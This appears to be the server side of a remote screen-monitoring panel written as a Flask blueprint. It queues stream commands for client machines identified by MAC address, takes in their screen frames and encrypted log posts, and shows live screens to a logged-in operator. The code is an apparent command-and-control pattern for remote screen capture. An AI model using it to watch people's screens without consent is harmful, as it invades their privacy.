from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
from datetime import datetime
import os, time, json, threading
from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, decrypt_data
try:
    from ui import ADMIN_CSS
except Exception:
    ADMIN_CSS = ""

bp = Blueprint('screen', __name__)

@bp.route('/api/stream/start/<mac>', methods=['POST'])
def api_stream_start(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    if mac in clients_db:
        clients_db[mac]['stream_active'] = True

        res = request.args.get('res', '1280')
        q = request.args.get('q', '30')

        upload_url = f"{request.host_url.rstrip('/')}/api/stream/upload/{mac}?res={res}&q={q}"
        cmd = f"F_CMD:STREAM:{upload_url}"
        clients_db[mac]['pending_file_cmd'] = cmd
        save_db()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"})

@bp.route('/screen/<mac>')
def screen_page(mac):
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    if mac not in clients_db: return "Device not found"
    SCREEN_HTML = """
    <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"><title>Screen - {{ info.name }} ({{ mac }})</title>
    <style>{{ admin_css|safe }}body{text-align:center}.screen-wrap{max-width:1180px;margin:0 auto;padding:18px}.stream-card{background:#fff;border:1px solid var(--line);border-radius:8px;padding:14px}.stream-controls{display:flex;flex-wrap:wrap;gap:8px;align-items:center;justify-content:center;margin:12px 0}.stream-controls select{width:auto;min-width:120px}#streamImg{width:100%;height:auto;max-width:100%;border:1px solid var(--line);border-radius:8px;box-shadow:0 4px 12px rgba(15,23,42,.12);margin-top:10px;background:#000;object-fit:contain}@media(max-width:640px){.stream-controls select,.stream-controls button{width:100%}}</style></head>
    <body onunload="stopStream()"><main class="screen-wrap"><div class="header"><div><b>Screen Stream</b><br><span class="subtle">{{ info.name }} [{{ mac }}]</span></div><a class="btn muted" href="/">Back</a></div><section class="stream-card"><div class="stream-controls"><label>Resolution <select id="resSelect"><option value="600">600p fast</option><option value="800">800p recommended</option><option value="1280" selected>1280p balanced</option><option value="1920">1080p source</option></select></label><label>Quality <select id="qualitySelect"><option value="10">10% fastest</option><option value="20">20% light</option><option value="30" selected>30% default</option><option value="60">60% high</option><option value="100">100% source</option></select></label><button id="startBtn" class="btn" onclick="startStream()">Start Stream</button><button id="stopBtn" class="btn danger" onclick="stopStream()" disabled>Stop Stream</button></div><div><span id="statusText" class="subtle">Click Start Stream to request continuous screen frames.</span><span id="fpsText" style="color:#dc2626;font-weight:700;margin-left:12px"></span></div><img id="streamImg" src="" alt="Waiting for stream" style="display:none"></section></main>
    <script>
    let fpsInterval=null;function startStream(){var bs=document.getElementById('startBtn'),bp=document.getElementById('stopBtn'),st=document.getElementById('statusText'),res=document.getElementById('resSelect').value,qual=document.getElementById('qualitySelect').value;bs.disabled=true;bp.disabled=false;st.innerText='Requesting stream process...';fetch('/api/stream/start/{{ mac }}?res='+res+'&q='+qual,{method:'POST'}).then(r=>r.json()).then(data=>{if(data.status==='ok'){st.innerText='Command sent. Waiting for frames...';var img=document.getElementById('streamImg');img.style.display='inline-block';setTimeout(()=>{img.src='/stream_video/{{ mac }}?t='+Date.now();st.innerText='Streaming';fpsInterval=setInterval(pollFps,1000)},1000)}else{st.innerText='Command failed';bs.disabled=false;bp.disabled=true}}).catch(e=>{st.innerText='Network error: '+e;bs.disabled=false;bp.disabled=true})}function stopStream(){document.getElementById('startBtn').disabled=false;document.getElementById('stopBtn').disabled=true;document.getElementById('statusText').innerText='Stream stopped';document.getElementById('streamImg').style.display='none';document.getElementById('streamImg').src='';document.getElementById('fpsText').innerText='';if(fpsInterval)clearInterval(fpsInterval);fetch('/api/stream/stop/{{ mac }}',{method:'POST',keepalive:true})}function pollFps(){fetch('/api/stream/fps/{{ mac }}').then(r=>r.json()).then(data=>{document.getElementById('fpsText').innerText='FPS: '+data.fps})}
    </script></body></html>
    """
    return render_template_string(SCREEN_HTML, admin_css=ADMIN_CSS, mac=mac, info=clients_db[mac])

@bp.route('/api/stream/stop/<mac>', methods=['POST'])
def api_stream_stop(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    if mac in clients_db:
        clients_db[mac]['stream_active'] = False
        save_db()
    return jsonify({"status": "ok"})

@bp.route('/api/stream/upload/<mac>', methods=['POST'])
def stream_upload(mac):
    try:
        if mac in clients_db:
            frame_data = request.data
            if not clients_db[mac].get('stream_active', False):
                return "STOP", 200

            if frame_data:
                clients_db[mac]['stream_frame'] = frame_data

                now = time.time()
                if 'stream_fps_start' not in clients_db[mac] or now - clients_db[mac].get('stream_fps_start', now) > 2.0:
                    clients_db[mac]['stream_fps_start'] = now
                    clients_db[mac]['stream_frames'] = 0

                clients_db[mac]['stream_frames'] += 1
                elapsed = now - clients_db[mac]['stream_fps_start']
                if elapsed >= 1.0:
                    clients_db[mac]['stream_fps'] = clients_db[mac]['stream_frames'] / elapsed
                    clients_db[mac]['stream_fps_start'] = now
                    clients_db[mac]['stream_frames'] = 0

            return "OK", 200
    except Exception as e:
        print("Stream exception:", e)
    return "OK", 200

@bp.route('/api/stream/fps/<mac>')
def api_stream_fps(mac):
    if not session.get('logged_in'): return jsonify({"fps": 0})
    if mac in clients_db:
        return jsonify({"fps": round(clients_db[mac].get('stream_fps', 0), 1)})
    return jsonify({"fps": 0})

from flask import Response
def generate_mjpeg(mac):
    yield b'--frame\r\n'
    last_frame = b''
    while clients_db.get(mac, {}).get('stream_active', False):
        frame = clients_db.get(mac, {}).get('stream_frame', b'')
        if frame and frame != last_frame:
            last_frame = frame
            yield (b'Content-Type: image/jpeg\r\n'
                   b'Content-Length: ' + str(len(frame)).encode() + b'\r\n\r\n' +
                   frame + b'\r\n--frame\r\n')
        else:
            time.sleep(0.01)

@bp.route('/stream_video/<mac>')
def stream_video(mac):
    if not session.get('logged_in'): return "未登录", 403
    if mac in clients_db:
        clients_db[mac]['stream_active'] = True
        save_db()
        return Response(generate_mjpeg(mac), mimetype='multipart/x-mixed-replace; boundary=frame')
    return "Error", 404

@bp.route('/api/screen/log', methods=['POST'])
def screen_log_endpoint():
    mac = decrypt_data(request.form.get('mac', ''))
    log_msg = decrypt_data(request.form.get('log', ''))
    if mac in clients_db and log_msg:
        import urllib.parse
        log_msg = urllib.parse.unquote(log_msg)
        clients_db[mac]['screen_log'] = clients_db[mac].get('screen_log', '') + log_msg + '\n'
        save_db()
    return "OK", 200


